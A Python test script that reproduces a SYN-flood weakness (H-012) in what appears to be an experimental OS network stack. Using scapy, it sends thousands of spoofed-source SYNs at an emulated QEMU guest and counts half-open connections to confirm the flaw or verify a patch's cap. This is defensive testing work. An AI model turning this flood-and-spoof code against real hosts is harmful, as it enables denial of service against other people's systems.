#!/usr/bin/env python3
"""repro/h012.py -- H-012 SYN flood / unbounded half-open reproducer.

Drives the netharness against a guest booted with the `iprepro`
profile (see docs-wip/IPSTACK-HARDENING.md §5):

    make -C src iprepro NET_HARNESS=5555            # one shell
    python3 src/tools/netharness/repro/h012.py --port 5555   # another

It floods TCP SYNs at the guest's listening port, each from a distinct
spoofed off-subnet source, and never completes a handshake.  Every SYN
the guest turns into a half-open (TCB_SYN_RCVD) connection makes it send
exactly one SYN-ACK back -- so the count of *distinct* sources that
received a SYN-ACK is a direct, externally visible census of half-open
TCBs.  No in-guest counter is needed; this is the harness's answer to
IPSTACK-HARDENING OQ-4.

Verdict:
  * VULNERABLE -- distinct half-opens track SYNs sent ~1:1 with no
    plateau: half-opens grow unbounded with attacker input (H-012
    confirmed on the unpatched stack).
  * CAPPED -- half-opens plateau well below the SYNs sent: some cap is
    in force.  The reported plateau value is the observed cap (the
    patch's TCP_MAX_SYNRCVD_PER_AO, an AFD backlog limit, ...).

Spoofed sources come from 198.18.0.0/15 (RFC 2544 benchmark range):
off-subnet relative to the guest's 10.0.2.0/24, so the guest routes
every SYN-ACK to its default gateway -- which is the harness -- and we
see them all regardless of the spoofed address.
"""

import argparse
import os
import socket
import struct
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from scapy.all import IP, TCP, conf            # noqa: E402

from harness import Harness                    # noqa: E402
from qlink import QLinkError                   # noqa: E402

conf.verb = 0

# 198.18.0.0/15 -- 131072 addresses, off-subnet, non-routable test range.
_SRC_BASE = 0xC6120000
_SRC_SPAN = 1 << 17


def _src(i):
    """The i-th distinct spoofed source (ip, port)."""
    ip = socket.inet_ntoa(struct.pack("!I", _SRC_BASE + (i % _SRC_SPAN)))
    return ip, 30000 + (i % 30000)


def _is_synack(tcp):
    return "S" in tcp.flags and "A" in tcp.flags


class _Census:
    """Observer: tallies the guest's SYN-ACKs and RSTs.

    A half-open is identified by the (spoofed-source ip, port) the guest
    addresses its SYN-ACK to; SYN-ACK retransmits for the same half-open
    collapse into the set, so the count is distinct half-opens."""

    def __init__(self, guest_ip):
        self.guest_ip = guest_ip
        self.half_opens = set()         # (ip, port) that got >=1 SYN-ACK
        self.synack_frames = 0          # incl. retransmits
        self.rsts = 0

    def __call__(self, pkt):
        if IP not in pkt or TCP not in pkt:
            return
        if pkt[IP].src != self.guest_ip:
            return
        tcp = pkt[TCP]
        if _is_synack(tcp):
            self.synack_frames += 1
            self.half_opens.add((pkt[IP].dst, tcp.dport))
        elif "R" in tcp.flags:
            self.rsts += 1


def _wait_listener(h, target_port, timeout):
    """Confirm the guest's TCP listener is up by eliciting one SYN-ACK."""
    probe_ip, probe_port = "198.19.255.254", 41000
    got = []

    def obs(pkt):
        if (IP in pkt and TCP in pkt and pkt[IP].src == h.guest_ip
                and pkt[IP].dst == probe_ip and _is_synack(pkt[TCP])):
            got.append(True)

    h.observers.append(obs)
    try:
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            h.send_ip(IP(src=probe_ip, dst=h.guest_ip) /
                      TCP(sport=probe_port, dport=target_port, flags="S",
                          seq=0x1000))
            end = time.monotonic() + 1.0
            while time.monotonic() < end:
                h.pump(timeout=0.25)
                if got:
                    return True
        return False
    finally:
        h.observers.remove(obs)


def _flood(h, target_port, count, census, log):
    """Send `count` SYNs from distinct spoofed sources; never ACK."""
    log("flooding %d SYNs at tcp/%d (no handshake completed) ..."
        % (count, target_port))
    for i in range(count):
        ip, port = _src(i)
        h.send_ip(IP(src=ip, dst=h.guest_ip) /
                  TCP(sport=port, dport=target_port, flags="S",
                      seq=0x40000000 + i))
        # Drain replies periodically so neither side's socket buffer
        # backs up during a long flood.
        if (i + 1) % 64 == 0:
            while h.pump(timeout=0) is not None:
                pass
        if (i + 1) % 512 == 0:
            log("  sent %d/%d, half-opens so far %d"
                % (i + 1, count, len(census.half_opens)))


def run(port, host, target_port, count, drain, expect):
    h = Harness(port, host=host)
    try:
        h.connect()
        h.bring_up()
    except QLinkError as e:
        print("h012: %s" % e, file=sys.stderr)
        h.close()
        return 2

    census = _Census(h.guest_ip)

    h.log("probing for the guest's TCP listener on tcp/%d ..." % target_port)
    if not _wait_listener(h, target_port, timeout=30.0):
        print("h012: guest never answered a SYN on tcp/%d -- is iprepro.lua "
              "listening there?" % target_port, file=sys.stderr)
        h.close()
        return 2
    h.log("listener is up")

    h.link.drain()                      # discard bring-up / probe traffic
    h.observers.append(census)
    t0 = time.monotonic()
    _flood(h, target_port, count, census, h.log)

    # Collect stragglers (SYN-ACKs still in flight, retransmits).
    h.log("flood sent; draining replies for %gs ..." % drain)
    deadline = time.monotonic() + drain
    while time.monotonic() < deadline:
        h.pump(timeout=0.2)
    elapsed = time.monotonic() - t0
    h.close()

    half = len(census.half_opens)
    print()
    print("H-012 SYN flood -- result")
    print("  SYNs sent ............ %d" % count)
    print("  distinct half-opens .. %d  (distinct sources that got a SYN-ACK)"
          % half)
    print("  SYN-ACK frames ....... %d  (incl. retransmits)"
          % census.synack_frames)
    print("  RSTs from guest ...... %d" % census.rsts)
    print("  elapsed .............. %.1fs" % elapsed)

    # A half-open count that tracks the SYNs sent means nothing capped
    # the accumulation; a count that lands well short means something
    # did.  90% is a generous line -- localhost loss is negligible, so
    # the unpatched stack should sit right at ~100%.
    capped = half < count * 0.9
    if capped:
        verdict = "CAPPED"
        print("  verdict .............. CAPPED at ~%d half-opens" % half)
    else:
        verdict = "VULNERABLE"
        print("  verdict .............. VULNERABLE -- half-opens unbounded "
              "(H-012 confirmed)")

    if expect == "auto":
        return 0
    ok = (expect == "capped" and capped) or (expect == "vuln" and not capped)
    print("  expected ............. %s -> %s"
          % (expect.upper(), "PASS" if ok else "FAIL"))
    return 0 if ok else 1


def main(argv=None):
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--port", type=int, required=True,
                    help="TCP port QEMU's socket netdev listens on "
                         "(matches NET_HARNESS=PORT)")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--target-port", type=int, default=9,
                    help="guest TCP port to flood (iprepro.lua listens on 9)")
    ap.add_argument("--count", type=int, default=4096,
                    help="number of SYNs to send (default 4096 -- above both "
                         "iprepro.lua's listen backlog of 1024 and the "
                         "patch's 256 per-listener cap, so whichever layer "
                         "caps half-opens shows as a plateau)")
    ap.add_argument("--drain", type=float, default=3.0,
                    help="seconds to keep collecting replies after the flood")
    ap.add_argument("--expect", choices=("auto", "vuln", "capped"),
                    default="auto",
                    help="auto: just measure (exit 0).  vuln/capped: also "
                         "assert the verdict (exit 1 on mismatch) -- use "
                         "'vuln' to confirm the finding, 'capped' to verify "
                         "the fix.")
    args = ap.parse_args(argv)
    return run(args.port, args.host, args.target_port, args.count,
               args.drain, args.expect)


if __name__ == "__main__":
    sys.exit(main())
